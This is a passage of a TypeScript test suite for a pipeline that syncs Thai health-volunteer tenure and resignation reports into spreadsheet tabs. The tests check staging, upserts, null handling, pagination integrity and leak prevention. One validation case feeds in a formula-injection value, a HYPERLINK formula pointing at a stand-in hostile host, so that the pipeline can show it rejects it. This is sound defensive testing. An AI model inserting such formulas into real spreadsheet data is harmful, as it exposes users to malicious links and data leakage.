        minimizedAttributes: cand.minimizedAttributes.map((attr) =>
          attr.value === null
            ? ({ field: attr.field } as unknown as { field: string; value: string | null })
            : attr,
        ),
      }),
    );

    const previewRes = finalizePreviewWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        sourceTotal: batch1.data.sourceTotal,
        pagesFetched: batch1.data.pagesFetchedInBatch + batch2.data.pagesFetchedInBatch,
        rowDigests: allDigests,
        aggregateSummary: [...batch1.data.aggregateSummary, ...batch2.data.aggregateSummary],
        sampleCandidates: wireCandidates,
      },
      env.platform,
    );
    expect(previewRes.ok).toBe(true);
    if (
      !previewRes.ok ||
      previewRes.data.status !== 'READY' ||
      previewRes.data.previewMode !== 'EXTENDED_MINIMIZED'
    ) {
      throw new Error(`Expected READY tenure preview, got ${JSON.stringify(previewRes)}`);
    }
    expect(previewRes.data.destinationTab).toBe('VolunteerTenure');
    expect(previewRes.data.counts).toEqual({ insert: 3, update: 0, unchanged: 0, review: 0 });
    expect(previewRes.data.reviewBreakdown).toEqual({});
    expect(previewRes.data.legacySnapshotPresent).toBe(true);
    expect(previewRes.data.legacySnapshotTab).toBe('RTenure_f010_20261119');
    expect(
      previewRes.data.sampleRows[0].minimizedAttributes.find((a) => a.field === 'startYear')?.value,
    ).toBeNull();

    const serialized = JSON.stringify({ batch1, batch2, previewRes });
    expect(serialized).not.toMatch(
      /PRIVATE_TENURE_FIRST|PRIVATE_TENURE_LAST|1540600000001|99990000000001|SYNTHETIC-UUID-0001/,
    );
    expect(serialized).not.toContain(VALID_HMAC_KEY);
    expect(env.getFlushCount()).toBe(0);
  });

  it('volunteer-tenure: keeps subdistrict/village mismatches as hard STOP/BLOCKED (OUT_OF_GEOGRAPHIC_SCOPE) and rejects invalid nullable integers, unexpected fields, duplicate keys, and formula injection', () => {
    const cases: Array<{
      label: string;
      rows: Record<string, unknown>[];
      expectedCode: string;
    }> = [
      {
        label: 'subdistrict outside 540601..540608 (hard STOP unlike resigned-volunteers)',
        rows: [makeTenureRow(1, { subdistrictCode: '540210' })],
        expectedCode: 'OUT_OF_GEOGRAPHIC_SCOPE',
      },
      {
        label: 'villageCode subdistrict prefix mismatch (hard STOP unlike resigned-volunteers)',
        rows: [makeTenureRow(1, { subdistrictCode: '540601', villageCode: '540602001' })],
        expectedCode: 'OUT_OF_GEOGRAPHIC_SCOPE',
      },
      {
        label: 'villageCode from another district (hard STOP unlike resigned-volunteers)',
        rows: [makeTenureRow(1, { subdistrictCode: '540601', villageCode: '540303004' })],
        expectedCode: 'OUT_OF_GEOGRAPHIC_SCOPE',
      },
      {
        label: 'villageNo disagrees with villageCode ordinal',
        rows: [
          makeTenureRow(1, {
            subdistrictCode: '540601',
            villageCode: '540601001',
            villageNo: '9',
          }),
        ],
        expectedCode: 'OUT_OF_GEOGRAPHIC_SCOPE',
      },
      {
        label: 'negative tenureYears integer',
        rows: [makeTenureRow(1, { tenureYears: -1 })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'fractional startYear integer',
        rows: [makeTenureRow(1, { startYear: 2545.5 })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'string-coerced osmYear integer',
        rows: [makeTenureRow(1, { osmYear: '2545' })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'boolean tenureYears',
        rows: [makeTenureRow(1, { tenureYears: false })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'numeric retirementDate instead of string_or_null',
        rows: [makeTenureRow(1, { retirementDate: 20260101 })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'unexpected source field',
        rows: [makeTenureRow(1, { PRIVATE_EXTRA_COL: 'DO_NOT_LEAK' })],
        expectedCode: 'UNEXPECTED_FIELD',
      },
      {
        label: 'formula injection in retirementReason',
        rows: [makeTenureRow(1, { retirementReason: '+HYPERLINK("https://evil.test")' })],
        expectedCode: 'FORMULA_INJECTION_DETECTED',
      },
      {
        label: 'duplicate key within batch',
        rows: [
          makeTenureRow(1, { id: 'DUP-TENURE-UUID' }),
          makeTenureRow(2, { id: 'DUP-TENURE-UUID' }),
        ],
        expectedCode: 'DUPLICATE_SOURCE_KEY',
      },
    ];

    for (const tc of cases) {
      const env = createFakeReportEnv({
        fetchHandler: () => jsonResponse(makeReportPage(tc.rows, 1, 10)),
      });
      const res = previewDatasetBatchWithPlatform(
        {
          endpoint: 'volunteer-tenure',
          token: VALID_BEARER,
          startPage: 1,
          batchPages: 1,
          pageSize: 10,
        },
        env.platform,
      );
      expect(res.ok, tc.label).toBe(true);
      if (!res.ok) throw new Error(tc.label);
      expect(res.data.status, tc.label).toBe('STOP_BLOCKED');
      if (res.data.status === 'STOP_BLOCKED') {
        expect(res.data.diagnostics[0]?.code, tc.label).toBe(tc.expectedCode);
        expect(JSON.stringify(res.data)).not.toMatch(/PRIVATE_EXTRA_COL|DO_NOT_LEAK/);
      }
    }
  });

  it('volunteer-tenure: commits multi-batch via hidden _Stage_volunteer-tenure_* preserving integer_or_null (0 vs null) and string_or_null (empty vs null) through staging & readback, executes repeatable Keyed Upsert into VolunteerTenure, preserves RTenure_* & ชีต1, and retains _Stage_* on unknown write failure', () => {
    let sourceRows: Record<string, unknown>[] = [
      makeTenureRow(1, {
        startYear: null,
        tenureYears: null,
        osmYear: null,
        approvalDate: null,
        retirementDate: '2026-01-02',
        retirementReason: 'resigned',
        osmStatus: null,
      }),
      makeTenureRow(2, {
        startYear: 2569,
        tenureYears: 0,
        osmYear: 2569,
        approvalDate: '2025-12-17',
        retirementDate: null,
        retirementReason: null,
        osmStatus: '',
      }),
      makeTenureRow(3, {
        startYear: 2545,
        tenureYears: 24,
        osmYear: 2545,
        approvalDate: '2025-12-17',
        retirementDate: null,
        retirementReason: null,
        osmStatus: '1',
      }),
    ];

    const env = createFakeReportEnv({
      workbooks: {
        [VALID_REF_SHEET_ID]: {
          name: 'ThaiPHC Reference',
          initialSheets: [{ name: 'ชีต1', rows: [['keep-ref']] }],
        },
        [VALID_REPORT_SHEET_ID]: {
          name: 'ThaiPHC Reports',
          initialSheets: [
            { name: 'ชีต1', rows: [['keep-report']] },
            {
              name: '_ThaiPHCReportCurrent',
              rows: [
                ['endpoint', 'run_id', 'snapshot_sheet', 'row_count', 'manifest_digest'],
                [
                  'volunteer-tenure',
                  'f010_20261119',
                  'RTenure_f010_20261119',
                  1571,
                  'c'.repeat(64),
                ],
              ],
            },
            { name: 'RTenure_f010_20261119', rows: [['legacy-tenure-keep']] },
          ],
        },
      },
      fetchHandler: (url) => {
        const parsed = new URL(url);
        const page = Number(parsed.searchParams.get('page'));
        const pageSize = Number(parsed.searchParams.get('pageSize'));
        return jsonResponse(makeReportPage(sourceRows, page, pageSize));
      },
    });

    // Run 1: Initial multi-batch commit
    const run1Preview = runFullBatchedPreview('volunteer-tenure', env.platform, 2, 1);
    if (
      !run1Preview.preview ||
      !run1Preview.preview.ok ||
      run1Preview.preview.data.status !== 'READY'
    ) {
      throw new Error(`Expected READY tenure preview run 1, got ${JSON.stringify(run1Preview)}`);
    }
    const fp1 = run1Preview.preview.data.fingerprint;

    const stage1 = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        expectedFingerprint: fp1,
        startPage: 1,
        batchPages: 1,
        pageSize: 2,
      },
      env.platform,
    );
    if (!stage1.ok || stage1.data.status !== 'BATCH_STAGED') {
      throw new Error(`Expected BATCH_STAGED tenure 1, got ${JSON.stringify(stage1)}`);
    }
    const stageTabName = stage1.data.stagingTabName;
    const stage2 = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        expectedFingerprint: fp1,
        runId: stage1.data.runId,
        startPage: 2,
        batchPages: 1,
        pageSize: 2,
      },
      env.platform,
    );
    if (!stage2.ok || stage2.data.status !== 'BATCH_STAGED') {
      throw new Error(`Expected BATCH_STAGED tenure 2, got ${JSON.stringify(stage2)}`);
    }

    const commit1 = finalizeLargeDatasetCommitWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        expectedFingerprint: fp1,
        runId: stage1.data.runId,
      },
      env.platform,
    );
    expect(commit1.ok).toBe(true);
    if (!commit1.ok || commit1.data.status !== 'COMMITTED_VERIFIED') {
      throw new Error(`Expected COMMITTED_VERIFIED tenure 1, got ${JSON.stringify(commit1)}`);
    }
    expect(commit1.data.readback.verified).toBe(true);
    expect(commit1.data.readback.stagingTabCleaned).toBe(true);

    const reportWb = env.workbookStates.get(VALID_REPORT_SHEET_ID)!;
    expect(reportWb.sheets.has(stageTabName)).toBe(false);
    expect(reportWb.sheets.get('RTenure_f010_20261119')?.rows).toEqual([['legacy-tenure-keep']]);
    expect(reportWb.sheets.get('ชีต1')?.rows).toEqual([['keep-report']]);

    // Verify 24 columns (16 approved + 8 metadata) and exact cell/number-format/presence fidelity
    const destSheet = reportWb.sheets.get('VolunteerTenure')!;
    expect(destSheet.rows[0]).toEqual([
      'startYear',
      'tenureYears',
      'osmYear',
      'approvalDate',
      'retirementDate',
      'retirementReason',
      'osmStatus',
      'provinceCode',
      'provinceName',
      'districtCode',
      'districtName',
      'subdistrictCode',
      'subdistrictName',
      'villageCode',
      'villageNo',
      'villageName',
      '_schema_version',
      '_sync_run_id',
      '_source_key',
      '_fetched_at_utc',
      '_quality_status',
      '_field_presence_json',
      '_last_seen_run_id',
      '_row_digest',
    ]);
    // Integer columns (C1..C3) remain numeric (no '@' text format); code/text columns get '@'
    expect(destSheet.numberFormats.has('C1')).toBe(false);
    expect(destSheet.numberFormats.has('C2')).toBe(false);
    expect(destSheet.numberFormats.has('C3')).toBe(false);
    expect(destSheet.numberFormats.get('C7')).toBe('@'); // osmStatus
    expect(destSheet.numberFormats.get('C14')).toBe('@'); // villageCode

    // Row 1 (null integers + null osmStatus): cells are '' with presence 'NULL'
    expect(destSheet.rows[1][0]).toBe('');
    expect(destSheet.rows[1][1]).toBe('');
    expect(destSheet.rows[1][6]).toBe('');
    expect(destSheet.rows[1][18]).toBe(EXPECTED_TENURE_H1_0001);
    const row1Presence = JSON.parse(String(destSheet.rows[1][21]));
    expect(row1Presence.tenureYears).toBe('NULL');
    expect(row1Presence.osmStatus).toBe('NULL');

    // Row 2 (tenureYears=0 numeric, osmStatus='' VALUE): preserves 0 vs null and '' vs null!
    expect(destSheet.rows[2][0]).toBe(2569);
    expect(destSheet.rows[2][1]).toBe(0);
    expect(destSheet.rows[2][6]).toBe('');
    expect(destSheet.rows[2][18]).toBe(EXPECTED_TENURE_H1_0002);
    const row2Presence = JSON.parse(String(destSheet.rows[2][21]));
    expect(row2Presence.tenureYears).toBe('VALUE');
    expect(row2Presence.osmStatus).toBe('VALUE');

    // Run 2: Repeatable sync — row 1 transitions null -> 0 / null -> '' (MUST detect UPDATE!), row 2 UNCHANGED, row 3 MISSING_IN_SOURCE (kept!), row 4 INSERTED
    sourceRows = [
      makeTenureRow(1, {
        startYear: 2569,
        tenureYears: 0,
        osmYear: 2569,
        approvalDate: null,
        retirementDate: '2026-01-02',
        retirementReason: 'resigned',
        osmStatus: '',
      }),
      makeTenureRow(2, {
        startYear: 2569,
        tenureYears: 0,
        osmYear: 2569,
        approvalDate: '2025-12-17',
        retirementDate: null,
        retirementReason: null,
        osmStatus: '',
      }),
      makeTenureRow(4, {
        startYear: 2560,
        tenureYears: 9,
        osmYear: 2560,
        approvalDate: '2020-05-01',
        retirementDate: null,
        retirementReason: null,
        osmStatus: '1',
      }),
    ];

    const run2Preview = runFullBatchedPreview('volunteer-tenure', env.platform, 10, 1);
    if (
      !run2Preview.preview ||
      !run2Preview.preview.ok ||
      run2Preview.preview.data.status !== 'READY'
    ) {
      throw new Error(`Expected READY tenure preview run 2, got ${JSON.stringify(run2Preview)}`);
    }
    expect(run2Preview.preview.data.counts).toEqual({
      insert: 1,
      update: 1,
      unchanged: 1,
      review: 1,
    });
    expect(run2Preview.preview.data.reviewBreakdown).toEqual({ MISSING_IN_SOURCE: 1 });

    const run2Stage = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        expectedFingerprint: run2Preview.preview.data.fingerprint,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      env.platform,
    );
    if (!run2Stage.ok || run2Stage.data.status !== 'BATCH_STAGED') {
      throw new Error(`Expected BATCH_STAGED tenure run 2, got ${JSON.stringify(run2Stage)}`);
    }
    const run2Commit = finalizeLargeDatasetCommitWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        expectedFingerprint: run2Preview.preview.data.fingerprint,
        runId: run2Stage.data.runId,
      },
      env.platform,
    );
    expect(run2Commit.ok).toBe(true);
    if (!run2Commit.ok || run2Commit.data.status !== 'COMMITTED_VERIFIED') {
      throw new Error(
        `Expected COMMITTED_VERIFIED tenure run 2, got ${JSON.stringify(run2Commit)}`,
      );
    }
    expect(run2Commit.data.readback.expectedRowCount).toBe(4);
    expect(destSheet.rows[1][1]).toBe(0);
    expect(JSON.parse(String(destSheet.rows[1][21])).osmStatus).toBe('VALUE');

    // Failure case: write throws on live tab -> UNKNOWN_OUTCOME_STOP retains hidden _Stage_volunteer-tenure_* and leaves STARTED in _ThaiPHCSyncLog
    const failEnv = createFakeReportEnv({
      failWriteOnTab: 'VolunteerTenure',
      fetchHandler: () => jsonResponse(makeReportPage([makeTenureRow(1)], 1, 10)),
    });
    const failPrev = runFullBatchedPreview('volunteer-tenure', failEnv.platform, 10, 1);
    if (!failPrev.preview || !failPrev.preview.ok || failPrev.preview.data.status !== 'READY') {
      throw new Error('Expected READY failPrev');
    }
    const failStage = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        expectedFingerprint: failPrev.preview.data.fingerprint,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      failEnv.platform,
    );
    if (!failStage.ok || failStage.data.status !== 'BATCH_STAGED') {
      throw new Error('Expected BATCH_STAGED failStage');
    }
    const failCommit = finalizeLargeDatasetCommitWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        expectedFingerprint: failPrev.preview.data.fingerprint,
        runId: failStage.data.runId,
      },
      failEnv.platform,
    );
    expect(failCommit.ok).toBe(true);
    if (!failCommit.ok || failCommit.data.status !== 'UNKNOWN_OUTCOME_STOP') {
      throw new Error(`Expected UNKNOWN_OUTCOME_STOP, got ${JSON.stringify(failCommit)}`);
    }
    expect(failCommit.data.syncLogStatus).toBe('STARTED');
    expect(failCommit.data.stagingTabRetained).toBe(failStage.data.stagingTabName);
    const failReportWb = failEnv.workbookStates.get(VALID_REPORT_SHEET_ID)!;
    expect(failReportWb.sheets.get(failStage.data.stagingTabName)?.hidden).toBe(true);
  });

  it('enforces report pagination integrity (SOURCE_TOTAL_CHANGED, INVALID_ENVELOPE, INCOMPLETE_SNAPSHOT, ROW_LIMIT_EXCEEDED), rejects commit when preview review counts omit LOCALITY_MISMATCH, prevents LOCALITY_MISMATCH sample starvation under >=50 MISSING_IN_SOURCE rows, and matches F010 000/0 villageCode semantics on volunteer-tenure', () => {
    // 1. Report pagination negative checks across both endpoints
    const badEnvelopeEnv = createFakeReportEnv({
      fetchHandler: () =>
        jsonResponse({
          success: false,
          message: 'Bad',
          items: [],
          total: 0,
          page: 1,
          pageSize: 10,
        }),
    });
    const badEnvRes = previewDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      badEnvelopeEnv.platform,
    );
    expect(badEnvRes.ok && badEnvRes.data.status === 'STOP_BLOCKED').toBe(true);
    if (badEnvRes.ok && badEnvRes.data.status === 'STOP_BLOCKED') {
      expect(badEnvRes.data.diagnostics[0]?.code).toBe('INVALID_ENVELOPE');
    }

    const totalDriftEnv = createFakeReportEnv({
      fetchHandler: () =>
        jsonResponse(makeReportPage([makeTenureRow(1), makeTenureRow(2)], 2, 1, 5)),
    });
    const totalDriftRes = previewDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        startPage: 2,
        batchPages: 1,
        pageSize: 1,
        expectedSourceTotal: 4,
      },
      totalDriftEnv.platform,
    );
    expect(totalDriftRes.ok && totalDriftRes.data.status === 'STOP_BLOCKED').toBe(true);
    if (totalDriftRes.ok && totalDriftRes.data.status === 'STOP_BLOCKED') {
      expect(totalDriftRes.data.diagnostics[0]?.code).toBe('SOURCE_TOTAL_CHANGED');
    }

    const incompleteEnv = createFakeReportEnv({
      fetchHandler: () =>
        jsonResponse({
          success: true,
          message: 'Success',
          items: [makeTenureRow(1)], // Expected 2 items for total=3, page=1, pageSize=2
          total: 3,
          page: 1,
          pageSize: 2,
        }),
    });
    const incompleteRes = previewDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 2,
      },
      incompleteEnv.platform,
    );
    expect(incompleteRes.ok && incompleteRes.data.status === 'STOP_BLOCKED').toBe(true);
    if (incompleteRes.ok && incompleteRes.data.status === 'STOP_BLOCKED') {
      expect(incompleteRes.data.diagnostics[0]?.code).toBe('INCOMPLETE_SNAPSHOT');
    }

    const oversizeEnv = createFakeReportEnv({
      fetchHandler: () =>
        jsonResponse({
          success: true,
          message: 'Success',
          items: [makeResignedRow(1)],
          total: 2501,
          page: 1,
          pageSize: 10,
        }),
    });
    const oversizeRes = previewDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      oversizeEnv.platform,
    );
    expect(oversizeRes.ok && oversizeRes.data.status === 'STOP_BLOCKED').toBe(true);
    if (oversizeRes.ok && oversizeRes.data.status === 'STOP_BLOCKED') {
      expect(oversizeRes.data.diagnostics[0]?.code).toBe('ROW_LIMIT_EXCEEDED');
    }

    // 2. Omitted reviewReasons in finalizePreview causes counts.review mismatch at finalizeLargeDatasetCommit -> PREVIEW_STALE_RECONFIRM_REQUIRED before live tab write
    const mismatchRow = makeResignedRow(1, {
      subdistrictCode: '540210',
      villageCode: '540603006',
      villageNo: '6',
    });
    const staleCountsEnv = createFakeReportEnv({
      fetchHandler: () => jsonResponse(makeReportPage([mismatchRow], 1, 10)),
    });
    const batch = previewDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      staleCountsEnv.platform,
    );
    if (!batch.ok || batch.data.status !== 'BATCH_OK') throw new Error('Expected BATCH_OK');
    // Caller omits reviewReasons when finalizing preview -> fingerprint records review=0
    const forgedPreview = finalizePreviewWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        sourceTotal: 1,
        pagesFetched: 1,
        rowDigests: batch.data.rowDigests.map(({ key, rowDigest }) => ({ key, rowDigest })),
        aggregateSummary: batch.data.aggregateSummary,
        sampleCandidates: batch.data.sampleCandidates,
      },
      staleCountsEnv.platform,
    );
    if (!forgedPreview.ok || forgedPreview.data.status !== 'READY') {
      throw new Error('Expected READY');
    }
    expect(forgedPreview.data.fingerprint.counts.review).toBe(0);

    const staged = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        expectedFingerprint: forgedPreview.data.fingerprint,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      staleCountsEnv.platform,
    );
    if (!staged.ok || staged.data.status !== 'BATCH_STAGED')
      throw new Error('Expected BATCH_STAGED');

    const finRes = finalizeLargeDatasetCommitWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        expectedFingerprint: forgedPreview.data.fingerprint,
        runId: staged.data.runId,
      },
      staleCountsEnv.platform,
    );
    expect(finRes.ok).toBe(true);
    if (!finRes.ok) throw new Error('Expected ok');
    expect(finRes.data.status).toBe('PREVIEW_STALE_RECONFIRM_REQUIRED');
    // Live ResignedVolunteers tab was never created/mutated
    expect(
      staleCountsEnv.workbookStates.get(VALID_REPORT_SHEET_ID)?.sheets.has('ResignedVolunteers'),
    ).toBe(false);

    // 3. LOCALITY_MISMATCH sample rows are NOT starved when >=50 destination rows are MISSING_IN_SOURCE
    const resignedHeaders = [
      'retirementDate',
      'retirementReason',
      'osmStatus',
      'volunteerStatus',
      'approvalStatus',
      'provinceCode',
      'provinceName',
      'districtCode',
      'districtName',
      'subdistrictCode',
      'subdistrictName',
      'villageCode',
      'villageNo',
      'villageName',
      '_schema_version',
      '_sync_run_id',
      '_source_key',
      '_fetched_at_utc',
      '_quality_status',
      '_field_presence_json',
      '_last_seen_run_id',
      '_row_digest',
    ];
    const existingMissingRows = Array.from({ length: 55 }, (_, i) => [
      '2024-01-01',
      'resigned',
      '0',
      'already_volunteer',
      'approved',
      '54',
      'แพร่',
      '5406',
      'สอง',
      '540601',
      'บ้านหนุน',
      '540601001',
      '1',
      'หนุนเหนือ',
      '0.1.0',
      'run_prev_01',
      `h1_${String(i + 1).padStart(64, '0')}`,
      '2026-11-20T00:00:00.000Z',
      'VALID',
      '{}',
      'run_prev_01',
      'a'.repeat(64),
    ]);
    const starvationEnv = createFakeReportEnv({
      workbooks: {
        [VALID_REF_SHEET_ID]: {
          name: 'ThaiPHC Reference',
          initialSheets: [{ name: 'ชีต1', rows: [['keep']] }],
        },
        [VALID_REPORT_SHEET_ID]: {
          name: 'ThaiPHC Reports',
          initialSheets: [
            { name: 'ชีต1', rows: [['keep']] },
            { name: 'ResignedVolunteers', rows: [resignedHeaders, ...existingMissingRows] },
          ],
        },
      },
      fetchHandler: () => jsonResponse(makeReportPage([mismatchRow], 1, 10)),
    });
    const nonStarved = runFullBatchedPreview('resigned-volunteers', starvationEnv.platform, 10, 1);
    if (
      !nonStarved.preview ||
      !nonStarved.preview.ok ||
      nonStarved.preview.data.status !== 'READY' ||
      nonStarved.preview.data.previewMode !== 'EXTENDED_MINIMIZED'
    ) {
      throw new Error('Expected READY EXTENDED_MINIMIZED');
    }
    expect(nonStarved.preview.data.reviewBreakdown).toEqual({
      LOCALITY_MISMATCH: 1,
      MISSING_IN_SOURCE: 55,
    });
    expect(
      nonStarved.preview.data.sampleRows.some((r) => r.reviewReasons.includes('LOCALITY_MISMATCH')),
    ).toBe(true);
    expect(
      nonStarved.preview.data.sampleRows.some((r) => r.reviewReasons.includes('MISSING_IN_SOURCE')),
    ).toBe(true);

    // 4. F010 parity: volunteer-tenure allows villageCode='540601000' + villageNo='0' (matches ReportReceiver.gs)
    const zeroVillageEnv = createFakeReportEnv({
      fetchHandler: () =>
        jsonResponse(
          makeReportPage(
            [
              makeTenureRow(1, {
                subdistrictCode: '540601',
                villageCode: '540601000',
                villageNo: '0',
              }),
            ],
            1,
            10,
          ),
        ),
    });
    const zeroVillageBatch = previewDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      zeroVillageEnv.platform,
    );
    expect(zeroVillageBatch.ok && zeroVillageBatch.data.status === 'BATCH_OK').toBe(true);
  });
});
